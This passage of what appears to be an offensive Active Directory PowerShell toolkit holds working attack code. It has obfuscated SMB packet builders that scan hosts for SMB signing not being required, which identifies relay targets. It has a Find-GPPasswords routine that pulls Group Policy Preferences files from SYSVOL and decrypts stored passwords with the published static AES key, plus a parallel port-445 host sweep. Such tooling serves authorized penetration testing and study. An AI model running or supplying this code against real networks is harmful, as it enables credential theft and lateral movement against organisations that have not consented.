			}

			function Q5R6S7T8()
			{
				$KK = New-Object System.Collections.Specialized.OrderedDictionary
				$KK.Add("P1",[Byte[]](0x00))
				$KK.Add("P2",[Byte[]](0x00,0x00))

				return $KK
			}

			function R6S7T8U9()
			{
				$LL = New-Object System.Collections.Specialized.OrderedDictionary
				$LL.Add("Q1",[Byte[]](0x02))
				$LL.Add("Q2",[Byte[]](0xff))
				$LL.Add("Q3",[Byte[]](0x00))
				$LL.Add("Q4",[Byte[]](0x00,0x00))
				$LL.Add("Q5",[Byte[]](0x00,0x00))

				return $LL
			}

			function S7T8U9V0()
			{
				param([Byte[]]$MM,[Int]$NN,[Byte[]]$OO,[Byte[]]$PP)

				[Byte[]]$QQ = [System.BitConverter]::GetBytes($NN) + 0x00,0x00,0x00,0x00

				$RR = New-Object System.Collections.Specialized.OrderedDictionary
				$RR.Add("R1",[Byte[]](0xfe,0x53,0x4d,0x42))
				$RR.Add("R2",[Byte[]](0x40,0x00))
				$RR.Add("R3",[Byte[]](0x01,0x00))
				$RR.Add("R4",[Byte[]](0x00,0x00))
				$RR.Add("R5",[Byte[]](0x00,0x00))
				$RR.Add("R6",$MM)
				$RR.Add("R7",[Byte[]](0x00,0x00))
				$RR.Add("R8",[Byte[]](0x00,0x00,0x00,0x00))
				$RR.Add("R9",[Byte[]](0x00,0x00,0x00,0x00))
				$RR.Add("S1",$QQ)
				$RR.Add("S2",[Byte[]](0x00,0x00,0x00,0x00))
				$RR.Add("S3",$OO)
				$RR.Add("S4",$PP)
				$RR.Add("S5",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

				return $RR
			}

			function T8U9V0W1()
			{
				$SS = New-Object System.Collections.Specialized.OrderedDictionary
				$SS.Add("T1",[Byte[]](0x24,0x00))
				$SS.Add("T2",[Byte[]](0x02,0x00))
				$SS.Add("T3",[Byte[]](0x01,0x00))
				$SS.Add("T4",[Byte[]](0x00,0x00))
				$SS.Add("T5",[Byte[]](0x40,0x00,0x00,0x00))
				$SS.Add("T6",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
				$SS.Add("T7",[Byte[]](0x00,0x00,0x00,0x00))
				$SS.Add("T8",[Byte[]](0x00,0x00))
				$SS.Add("T9",[Byte[]](0x00,0x00))
				$SS.Add("U1",[Byte[]](0x02,0x02))
				$SS.Add("U2",[Byte[]](0x10,0x02))

				return $SS
			}

			function U9V0W1X2()
			{
				param([Byte[]]$TT)

				[Byte[]]$UU = [System.BitConverter]::GetBytes($TT.Length)
				$UU = $UU[0,1]

				$VV = New-Object System.Collections.Specialized.OrderedDictionary
				$VV.Add("U3",[Byte[]](0x19,0x00))
				$VV.Add("U4",[Byte[]](0x00))
				$VV.Add("U5",[Byte[]](0x01))
				$VV.Add("U6",[Byte[]](0x00,0x00,0x00,0x00))
				$VV.Add("U7",[Byte[]](0x00,0x00,0x00,0x00))
				$VV.Add("U8",[Byte[]](0x58,0x00))
				$VV.Add("U9",$UU)
				$VV.Add("V1",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
				$VV.Add("V2",$TT)

				return $VV 
			}

			function V0W1X2Y3()
			{
				param([Byte[]]$WW)

				[Byte[]]$XX = [System.BitConverter]::GetBytes($WW.Length)
				$XX = $XX[0,1]

				$YY = New-Object System.Collections.Specialized.OrderedDictionary
				$YY.Add("V3",[Byte[]](0x09,0x00))
				$YY.Add("V4",[Byte[]](0x00,0x00))
				$YY.Add("V5",[Byte[]](0x48,0x00))
				$YY.Add("V6",$XX)
				$YY.Add("V7",$WW)

				return $YY
			}

			function W1X2Y3Z4()
			{
				param([Byte[]]$ZZ)

				$AAA = [System.BitConverter]::GetBytes($ZZ.Length)
				$AAA = $AAA[0,1]

				$BBB = New-Object System.Collections.Specialized.OrderedDictionary
				$BBB.Add("W1",[Byte[]](0x39,0x00))
				$BBB.Add("W2",[Byte[]](0x00))
				$BBB.Add("W3",[Byte[]](0x00))
				$BBB.Add("W4",[Byte[]](0x02,0x00,0x00,0x00))
				$BBB.Add("W5",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
				$BBB.Add("W6",[Byte[]](0x00,0x00,0x00,0x00))
				$BBB.Add("W7",[Byte[]](0x03,0x00,0x00,0x00))
				$BBB.Add("W8",[Byte[]](0x80,0x00,0x00,0x00))
				$BBB.Add("W9",[Byte[]](0x01,0x00,0x00,0x00))
				$BBB.Add("X1",[Byte[]](0x01,0x00,0x00,0x00))
				$BBB.Add("X2",[Byte[]](0x40,0x00,0x00,0x00))
				$BBB.Add("X3",[Byte[]](0x78,0x00))
				$BBB.Add("X4",$AAA)
				$BBB.Add("X5",[Byte[]](0x00,0x00,0x00,0x00))
				$BBB.Add("X6",[Byte[]](0x00,0x00,0x00,0x00))
				$BBB.Add("X7",$ZZ)

				return $BBB
			}

			function X2Y3Z4A5()
			{
				param ([Byte[]]$CCC)

				$DDD = New-Object System.Collections.Specialized.OrderedDictionary
				$DDD.Add("X8",[Byte[]](0x31,0x00))
				$DDD.Add("X9",[Byte[]](0x50))
				$DDD.Add("Y1",[Byte[]](0x00))
				$DDD.Add("Y2",[Byte[]](0x00,0x00,0x10,0x00))
				$DDD.Add("Y3",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
				$DDD.Add("Y4",$CCC)
				$DDD.Add("Y5",[Byte[]](0x00,0x00,0x00,0x00))
				$DDD.Add("Y6",[Byte[]](0x00,0x00,0x00,0x00))
				$DDD.Add("Y7",[Byte[]](0x00,0x00))
				$DDD.Add("Y8",[Byte[]](0x00,0x00))
				$DDD.Add("Y9",[Byte[]](0x30))

				return $DDD
			}

			function Y3Z4A5B6()
			{
				param([Byte[]]$EEE,[Int]$FFF)

				[Byte[]]$GGG = [System.BitConverter]::GetBytes($FFF)

				$HHH = New-Object System.Collections.Specialized.OrderedDictionary
				$HHH.Add("Z1",[Byte[]](0x31,0x00))
				$HHH.Add("Z2",[Byte[]](0x70,0x00))
				$HHH.Add("Z3",$GGG)
				$HHH.Add("Z4",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
				$HHH.Add("Z5",$EEE)
				$HHH.Add("Z6",[Byte[]](0x00,0x00,0x00,0x00))
				$HHH.Add("Z7",[Byte[]](0x00,0x00))
				$HHH.Add("Z8",[Byte[]](0x00,0x00))
				$HHH.Add("Z9",[Byte[]](0x00,0x00,0x00,0x00))

				return $HHH
			}

			function Z4A5B6C7()
			{
				param ([Byte[]]$III)

				$JJJ = New-Object System.Collections.Specialized.OrderedDictionary
				$JJJ.Add("A5",[Byte[]](0x18,0x00))
				$JJJ.Add("A6",[Byte[]](0x00,0x00))
				$JJJ.Add("A7",[Byte[]](0x00,0x00,0x00,0x00))
				$JJJ.Add("A8",$III)

				return $JJJ
			}

			function A5B6C7D8()
			{
				$KKK = New-Object System.Collections.Specialized.OrderedDictionary
				$KKK.Add("A9",[Byte[]](0x04,0x00))
				$KKK.Add("B6",[Byte[]](0x00,0x00))

				return $KKK
			}

			function B6C7D8E9()
			{
				$LLL = New-Object System.Collections.Specialized.OrderedDictionary
				$LLL.Add("B7",[Byte[]](0x04,0x00))
				$LLL.Add("B8",[Byte[]](0x00,0x00))

				return $LLL
			}

			function C7D8E9F0()
			{
				param([Byte[]]$MMM,[Byte[]]$NNN)

				[Byte[]]$OOO = [System.BitConverter]::GetBytes(32 + $NNN.Length)
				$OOO = $OOO[0]
				[Byte[]]$PPP = $OOO[0] + 32
				[Byte[]]$QQQ = $OOO[0] + 22
				[Byte[]]$RRR = $OOO[0] + 20
				[Byte[]]$SSS = $OOO[0] + 2

				$TTT = New-Object System.Collections.Specialized.OrderedDictionary
				$TTT.Add("C9",[Byte[]](0x60))
				$TTT.Add("D6",$PPP)
				$TTT.Add("D7",[Byte[]](0x06))
				$TTT.Add("D8",[Byte[]](0x06))
				$TTT.Add("D9",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
				$TTT.Add("E2",[Byte[]](0xa0))
				$TTT.Add("E3",$QQQ)
				$TTT.Add("E4",[Byte[]](0x30))
				$TTT.Add("E5",$RRR)
				$TTT.Add("E6",[Byte[]](0xa0))
				$TTT.Add("E7",[Byte[]](0x0e))
				$TTT.Add("E8",[Byte[]](0x30))
				$TTT.Add("E9",[Byte[]](0x0c))
				$TTT.Add("F4",[Byte[]](0x06))
				$TTT.Add("F5",[Byte[]](0x0a))
				$TTT.Add("F6",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
				$TTT.Add("G0",[Byte[]](0xa2))
				$TTT.Add("G1",$SSS)
				$TTT.Add("G2",[Byte[]](0x04))
				$TTT.Add("G3",$OOO)
				$TTT.Add("G4",[Byte[]](0x4e,0x54,0x4d,0x4d,0x53,0x53,0x50,0x00))
				$TTT.Add("G5",[Byte[]](0x01,0x00,0x00,0x00))
				$TTT.Add("G6",$MMM)
				$TTT.Add("G7",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

				if($NNN)
				{
					$TTT.Add("G8",$NNN)
				}

				return $TTT
			}

			function D8E9F0G1()
			{
				param([Byte[]]$UUU)

				[Byte[]]$VVV = [System.BitConverter]::GetBytes($UUU.Length)
				$VVV = $VVV[1,0]
				[Byte[]]$WWW = [System.BitConverter]::GetBytes($UUU.Length + 12)
				$WWW = $WWW[1,0]
				[Byte[]]$XXX = [System.BitConverter]::GetBytes($UUU.Length + 8)
				$XXX = $XXX[1,0]
				[Byte[]]$YYY = [System.BitConverter]::GetBytes($UUU.Length + 4)
				$YYY = $YYY[1,0]

				$ZZZ = New-Object System.Collections.Specialized.OrderedDictionary
				$ZZZ.Add("H7",[Byte[]](0xa1,0x82))
				$ZZZ.Add("H8",$WWW)
				$ZZZ.Add("H9",[Byte[]](0x30,0x82))
				$ZZZ.Add("I6",$XXX)
				$ZZZ.Add("I7",[Byte[]](0xa2,0x82))
				$ZZZ.Add("I8",$YYY)
				$ZZZ.Add("I9",[Byte[]](0x04,0x82))
				$ZZZ.Add("J5",$VVV)
				$ZZZ.Add("J6",$UUU)

				return $ZZZ
			}

			function E9F0G1H2()
			{
				param([Int]$AAAA,[Byte[]]$BBBB,[Byte[]]$CCCC,[Byte[]]$DDDD,[Byte[]]$EEEE,[Byte[]]$FFFF)

				[Byte[]]$GGGG = [System.BitConverter]::GetBytes($AAAA)

				$HHHH = New-Object System.Collections.Specialized.OrderedDictionary
				$HHHH.Add("J8",[Byte[]](0x05))
				$HHHH.Add("J9",[Byte[]](0x00))
				$HHHH.Add("K1",[Byte[]](0x0b))
				$HHHH.Add("K2",[Byte[]](0x03))
				$HHHH.Add("K3",[Byte[]](0x10,0x00,0x00,0x00))
				$HHHH.Add("K4",[Byte[]](0x48,0x00))
				$HHHH.Add("K5",[Byte[]](0x00,0x00))
				$HHHH.Add("K6",$GGGG)
				$HHHH.Add("K7",[Byte[]](0xb8,0x10))
				$HHHH.Add("K8",[Byte[]](0xb8,0x10))
				$HHHH.Add("K9",[Byte[]](0x00,0x00,0x00,0x00))
				$HHHH.Add("L1",$CCCC)
				$HHHH.Add("L2",[Byte[]](0x00,0x00,0x00))
				$HHHH.Add("L3",$DDDD)
				$HHHH.Add("L4",[Byte[]](0x01))
				$HHHH.Add("L5",[Byte[]](0x00))
				$HHHH.Add("L6",$EEEE)
				$HHHH.Add("L7",$FFFF)
				$HHHH.Add("L8",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
				$HHHH.Add("L9",[Byte[]](0x02,0x00,0x00,0x00))

				if($CCCC[0] -eq 2)
				{
					$HHHH.Add("M0",[Byte[]](0x01,0x00))
					$HHHH.Add("M1",[Byte[]](0x01))
					$HHHH.Add("M2",[Byte[]](0x00))
					$HHHH.Add("M3",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
					$HHHH.Add("M4",[Byte[]](0x00,0x00))
					$HHHH.Add("M5",[Byte[]](0x00,0x00))
					$HHHH.Add("M6",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
					$HHHH.Add("M7",[Byte[]](0x01,0x00,0x00,0x00))
				}
				elseif($CCCC[0] -eq 3)
				{
					$HHHH.Add("M8",[Byte[]](0x01,0x00))
					$HHHH.Add("M9",[Byte[]](0x01))
					$HHHH.Add("N1",[Byte[]](0x00))
					$HHHH.Add("N2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
					$HHHH.Add("N3",[Byte[]](0x00,0x00))
					$HHHH.Add("N4",[Byte[]](0x00,0x00))
					$HHHH.Add("N5",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
					$HHHH.Add("N6",[Byte[]](0x01,0x00,0x00,0x00))
					$HHHH.Add("N7",[Byte[]](0x02,0x00))
					$HHHH.Add("N8",[Byte[]](0x01))
					$HHHH.Add("N9",[Byte[]](0x00))
					$HHHH.Add("O1",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
					$HHHH.Add("O2",[Byte[]](0x00,0x00))
					$HHHH.Add("O3",[Byte[]](0x00,0x00))
					$HHHH.Add("O4",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
					$HHHH.Add("O5",[Byte[]](0x01,0x00,0x00,0x00))
					$HHHH.Add("O6",[Byte[]](0x0a))
					$HHHH.Add("O7",[Byte[]](0x04))
					$HHHH.Add("O8",[Byte[]](0x00))
					$HHHH.Add("O9",[Byte[]](0x00))
					$HHHH.Add("P1",[Byte[]](0x00,0x00,0x00,0x00))
					$HHHH.Add("P2",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
					$HHHH.Add("P3",[Byte[]](0x01,0x00,0x00,0x00))
					$HHHH.Add("P4",[Byte[]](0x97,0x82,0x08,0xe2))
					$HHHH.Add("P5",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
					$HHHH.Add("P6",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
					$HHHH.Add("P7",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
				}

				if($AAAA -eq 3)
				{
					$HHHH.Add("Q6",[Byte[]](0x0a))
					$HHHH.Add("Q7",[Byte[]](0x02))
					$HHHH.Add("Q8",[Byte[]](0x00))
					$HHHH.Add("Q9",[Byte[]](0x00))
					$HHHH.Add("R2",[Byte[]](0x00,0x00,0x00,0x00))
					$HHHH.Add("R3",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
					$HHHH.Add("R4",[Byte[]](0x01,0x00,0x00,0x00))
					$HHHH.Add("R5",[Byte[]](0x97,0x82,0x08,0xe2))
					$HHHH.Add("R6",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
					$HHHH.Add("R7",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
					$HHHH.Add("R8",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
				}

				return $HHHH
			}

			function F0G1H2I3()
			{
				param([Byte[]]$IIII,[Int]$JJJJ,[Int]$KKKK,[Int]$LLLL,[Byte[]]$MMMM,[Byte[]]$NNNN,[Byte[]]$OOOO,[Byte[]]$PPPP)

				if($KKKK -gt 0)
				{
					$QQQQ = $KKKK + $LLLL + 8
				}

				[Byte[]]$RRRR = [System.BitConverter]::GetBytes($JJJJ + 24 + $QQQQ + $PPPP.Length)
				[Byte[]]$SSSS = $RRRR[0,1]
				[Byte[]]$TTTT = [System.BitConverter]::GetBytes($JJJJ + $PPPP.Length)
				[Byte[]]$UUUU = [System.BitConverter]::GetBytes($KKKK)
				$UUUU = $UUUU[0,1]

				$VVVV = New-Object System.Collections.Specialized.OrderedDictionary
				$VVVV.Add("T2",[Byte[]](0x05))
				$VVVV.Add("T3",[Byte[]](0x00))
				$VVVV.Add("T4",[Byte[]](0x00))
				$VVVV.Add("T5",$IIII)
				$VVVV.Add("T6",[Byte[]](0x10,0x00,0x00,0x00))
				$VVVV.Add("T7",$SSSS)
				$VVVV.Add("T8",$UUUU)
				$VVVV.Add("T9",$MMMM)
				$VVVV.Add("U3",$TTTT)
				$VVVV.Add("U4",$NNNN)
				$VVVV.Add("U5",$OOOO)

				if($PPPP.Length)
				{
					$VVVV.Add("U6",$PPPP)
				}

				return $VVVV
			}

			function G1H2I3J4()
			{
				param ([Byte[]]$RRRR,[Byte[]]$SSSS)

				[Byte[]]$TTTT = [System.BitConverter]::GetBytes($RRRR.Length + 92)
				[Byte[]]$UUUU = $TTTT[0,1]
				[Byte[]]$VVVV = [System.BitConverter]::GetBytes($RRRR.Length + 68)
				$WWWW = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
				$WWWW = $WWWW.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
				$WWWW += 0x00,0x00
				$XXXX = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
				$XXXX = $XXXX.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
				$XXXX += 0x00,0x00

				$YYYY = New-Object System.Collections.Specialized.OrderedDictionary
				$YYYY.Add("U5",$WWWW)
				$YYYY.Add("U6",$SSSS)
				$YYYY.Add("U7",[Byte[]](0x00,0x00,0x00,0x00))
				$YYYY.Add("U8",$SSSS)
				$YYYY.Add("U9",$RRRR)
				$YYYY.Add("V3",$XXXX)
				$YYYY.Add("V4",[Byte[]](0x0f,0x00,0x00,0x00))
				$YYYY.Add("V5",[Byte[]](0x00,0x00,0x00,0x00))
				$YYYY.Add("V6",[Byte[]](0x0f,0x00,0x00,0x00))
				$YYYY.Add("V7",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
				$YYYY.Add("V8",[Byte[]](0xbf,0xbf))
				$YYYY.Add("V9",[Byte[]](0x3f,0x00,0x00,0x00))
			
				return $YYYY
			}

			function H2I3J4K5()
			{
				param([Byte[]]$AAAAA,[Byte[]]$BBBBB,[Byte[]]$CCCCC,[Byte[]]$DDDDD)

				$EEEEE = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
				$EEEEE = $EEEEE.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
				$EEEEE += 0x00,0x00

				$FFFFF = New-Object System.Collections.Specialized.OrderedDictionary
				$FFFFF.Add("V5",$AAAAA)
				$FFFFF.Add("V6",$BBBBB)
				$FFFFF.Add("V7",[Byte[]](0x00,0x00,0x00,0x00))
				$FFFFF.Add("V8",$BBBBB)
				$FFFFF.Add("V9",$AAAAA)
				$FFFFF.Add("W2",$EEEEE)
				$FFFFF.Add("W3",$BBBBB)
				$FFFFF.Add("W4",[Byte[]](0x00,0x00,0x00,0x00))
				$FFFFF.Add("W5",$BBBBB)
				$FFFFF.Add("W6",$AAAAA)
				$FFFFF.Add("W7",[Byte[]](0xff,0x01,0x0f,0x00))
				$FFFFF.Add("W8",[Byte[]](0x10,0x00,0x00,0x00))
				$FFFFF.Add("W9",[Byte[]](0x03,0x00,0x00,0x00))
				$FFFFF.Add("X1",[Byte[]](0x00,0x00,0x00,0x00))
				$FFFFF.Add("X2",$DDDDD)
				$FFFFF.Add("X3",[Byte[]](0x00,0x00,0x00,0x00))
				$FFFFF.Add("X4",$DDDDD)
				$FFFFF.Add("X5",$CCCCC)
				$FFFFF.Add("X6",[Byte[]](0x00,0x00,0x00,0x00))
				$FFFFF.Add("X7",[Byte[]](0x00,0x00,0x00,0x00))
				$FFFFF.Add("X8",[Byte[]](0x00,0x00,0x00,0x00))
				$FFFFF.Add("X9",[Byte[]](0x00,0x00,0x00,0x00))

				return $FFFFF
			}

			function I3J4K5L6()
			{
				param([Byte[]]$GGGGG)

				$HHHHH = New-Object System.Collections.Specialized.OrderedDictionary
				$HHHHH.Add("X2",$GGGGG)
				$HHHHH.Add("X3",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

				return $HHHHH
			}

			function J4K5L6M7()
			{
				param([Byte[]]$IIIII)

				$JJJJJ = New-Object System.Collections.Specialized.OrderedDictionary
				$JJJJJ.Add("Y1",$IIIII)
				$JJJJJ.Add("Y2",[Byte[]](0x00,0x00,0x00,0x00))

				return $JJJJJ
			}

			$LLLLL = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
			$LLLLL = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($LLLLL))
			$LLLLL = $LLLLL -replace "-00-00",""
			[Byte[]]$MMMMM = $LLLLL.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

			function K5L6M7N8
			{
				param ($NNNNN,$OOOOO,$PPPPP)

				if($NNNNN)
				{
					$QQQQQ = $NNNNN.GetStream()
				}
				
				$RRRRR = New-Object System.Byte[] 1024
				$SSSSS = "NegotiateSMB"
				
				:TTTTT while($SSSSS -ne "exit")
				{
				
					switch ($SSSSS)
					{

						"NegotiateSMB"
						{
							$UUUUU = H7I8J9K0 0x72 0x18 0x01,0x48 0xff,0xff $MMMMM 0x00,0x00       
							$VVVVV = J8K9L0M1 $PPPPP
							$WWWWW = B3C4D5E6 $UUUUU
							$XXXXX = B3C4D5E6 $VVVVV
							$YYYYY = E4F5G6H7 $WWWWW.Length $XXXXX.Length
							$ZZZZZ = B3C4D5E6 $YYYYY

							$AAAAAA = $ZZZZZ + $WWWWW + $XXXXX
							$QQQQQ.Write($AAAAAA,0,$AAAAAA.Length) > $null
							$QQQQQ.Flush()    
							$QQQQQ.Read($RRRRR,0,$RRRRR.Length) > $null

							if([System.BitConverter]::ToString($RRRRR[4..7]) -eq "ff-53-4d-42")
							{
								$PPPPP = "SMB1"
								$SSSSS = "NTLMSSPNegotiate"
							}
							else
							{
								$SSSSS = "NegotiateSMB2"
							}

							if(($PPPPP -eq "SMB1" -and [System.BitConverter]::ToString($RRRRR[39]) -eq "0f") -or ($PPPPP -ne "SMB1" -and [System.BitConverter]::ToString($RRRRR[70]) -eq "03"))
							{
								$BBBBBB = $true
								
							} else {
								$BBBBBB = $false
							}
							$NNNNN.Close()
							$RRRRR = $null
							$SSSSS = "exit"

						}
					
					}

				}
				return $BBBBBB
			}

			$NNNNN = New-Object System.Net.Sockets.TCPClient
			$NNNNN.ReceiveTimeout = 100  # Set receive timeout to 1 second
			$NNNNN.SendTimeout = 100     # Set send timeout to 1 second
			try {
				$connectionTask = $NNNNN.BeginConnect($A1, 445, $null, $null)
				if (-not $connectionTask.AsyncWaitHandle.WaitOne(1000, $false)) {
					throw [System.TimeoutException]::new("Connection timed out")
				}
				$NNNNN.EndConnect($connectionTask)
				if (!$NNNNN.Connected) {
					Write-Output "$A1 is not responding"
					continue
				}
				$CCCCCC = $false
				$DDDDDD = K5L6M7N8 $NNNNN "smb2"
				if ($DDDDDD) {
					Write-Output "SMB signing is required on $A1"
				} else {
					Write-Output "SMB signing is not required on $A1"
				}
			} catch [System.TimeoutException] {
				Write-Output "Connection to $A1 timed out"
				continue
			} catch {
				Write-Output "Failed to connect to $A1"
				continue
			} finally {
				$NNNNN.Close()
			}
			if ($A3) {
				$EEEEE = get-random -Minimum 0 -Maximum $A4
				sleep ($A3 + $EEEEE)
			}
			
		}
		
		$Result = F5A6B8D8B -A1 $computer.dnshostname
		if($Result -like "SMB signing is not required*"){return $computer}
		return $null
	}

	# Use a generic list for better performance when adding items
	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

	foreach ($computer in $Targets) {
		$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
		$powerShellInstance.RunspacePool = $runspacePool
		$runspaces.Add([PSCustomObject]@{
			Instance = $powerShellInstance
			Status   = $powerShellInstance.BeginInvoke()
		})
	}

	# Collect the results
	$SMBStatus = @()
	foreach ($runspace in $runspaces) {
		$result = $runspace.Instance.EndInvoke($runspace.Status)
		if ($result) {
			$SMBStatus += $result
		}
	}

	if($SMBStatus){$SMBStatus}

	# Close and dispose of the runspace pool for good resource management
	$runspacePool.Close()
	$runspacePool.Dispose()
}

function Find-GPPasswords {

    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain
    )

    # Helper function to decrypt the cpassword field
    function Decode-EncryptedField {
        Param (
            [string] $EncryptedData
        )

        try {
            $LengthMod = ($EncryptedData.length % 4)
            switch ($LengthMod) {
                '1' { $EncryptedData = $EncryptedData.Substring(0, $EncryptedData.Length - 1) }
                '2' { $EncryptedData += ('=' * (4 - $LengthMod)) }
                '3' { $EncryptedData += ('=' * (4 - $LengthMod)) }
            }

            $DecodedBytes = [Convert]::FromBase64String($EncryptedData)
            $CryptoProvider = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $StaticKey = @(0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
                                    0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b)

            $CryptoProvider.IV = New-Object Byte[]($CryptoProvider.IV.Length) # Null IV
            $CryptoProvider.Key = $StaticKey
            $Decryptor = $CryptoProvider.CreateDecryptor()
            [System.Text.UnicodeEncoding]::Unicode.GetString($Decryptor.TransformFinalBlock($DecodedBytes, 0, $DecodedBytes.length))
        }
        catch {
            Write-Error "Error decrypting password: $_"
        }
    }

    # Helper function to parse XML files for credentials
    function Parse-CredentialFields {
        Param (
            [string] $FilePath
        )

        try {
            [xml] $XmlContent = Get-Content -Path $FilePath
            if ($XmlContent.InnerXml -match 'cpassword') {
                $XmlContent.GetElementsByTagName('Properties') | ForEach-Object {
                    $EncryptedPassword = $_.cpassword
                    if ($EncryptedPassword) {
                        $DecryptedPassword = Decode-EncryptedField -EncryptedData $EncryptedPassword
                        $Username = if ($_.userName) { $_.userName }
                                    elseif ($_.accountName) { $_.accountName }
                                    elseif ($_.runAs) { $_.runAs }
                                    else { '[BLANK]' }
                        $ChangedDate = $_.ParentNode.changed

                        $Result = [PSCustomObject]@{
                            Username  = $Username
                            Password  = $DecryptedPassword
                            Changed   = $ChangedDate
                            FilePath  = $FilePath
                        }
                        $Result
                    }
                }
            }
        }
        catch {
            Write-Warning "Failed to parse XML file '$FilePath' : $_"
        }
    }

    try {
        $XMLFiles = Get-ChildItem -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -Include 'Groups.xml', 'Services.xml', 'Scheduledtasks.xml', 'DataSources.xml' -ErrorAction SilentlyContinue
        if (-not $XMLFiles) { throw "No GPP XML files found in domain SYSVOL." }

        ForEach ($File in $XMLFiles) {
            Parse-CredentialFields -FilePath $File.FullName
        }
    }
    catch {
        Write-Error "An error occurred: $_"
    }
}

function CheckAliveHosts
{
	
    [CmdletBinding()] Param(

 	[Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
        [PSObject[]]
        $Targets

 	)
	
	# Initialize the runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	# Define the script block outside the loop for better efficiency
	$scriptBlock = {
		param ($computer)
		$tcpClient = New-Object System.Net.Sockets.TcpClient
		$asyncResult = $tcpClient.BeginConnect($computer.dnshostname, 445, $null, $null)
		$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
		if ($wait) {
			try {
				$tcpClient.EndConnect($asyncResult)
				return $computer
			} catch {}
		}
		$tcpClient.Close()
		return $null
	}

	# Use a generic list for better performance when adding items
	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

	foreach ($computer in $Targets) {
		$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
		$powerShellInstance.RunspacePool = $runspacePool
		$runspaces.Add([PSCustomObject]@{
			Instance = $powerShellInstance
			Status   = $powerShellInstance.BeginInvoke()
		})
	}

	# Collect the results
	$reachable_hosts = @()
	foreach ($runspace in $runspaces) {
		$result = $runspace.Instance.EndInvoke($runspace.Status)
		if ($result) {
			$reachable_hosts += $result
		}
	}

	if($reachable_hosts){$reachable_hosts}

	# Close and dispose of the runspace pool for good resource management
	$runspacePool.Close()
	$runspacePool.Dispose()
}

function Get-ADGuidMapping {
    param(
        [Parameter(Mandatory = $true)]
        [string] $Domain,
        [Parameter(Mandatory = $false)]
        [string] $Server
    )

    $guidMap = @{}

    # Construct LDAP paths
    $ldapPathRootDSE = "LDAP://"
    if ($PSBoundParameters.ContainsKey('Server')) {
        $ldapPathRootDSE += "$Server/"
    }
    $ldapPathRootDSE += "$Domain/RootDSE"

    # Connect to the Domain RootDSE to get the schema naming context and configuration naming context
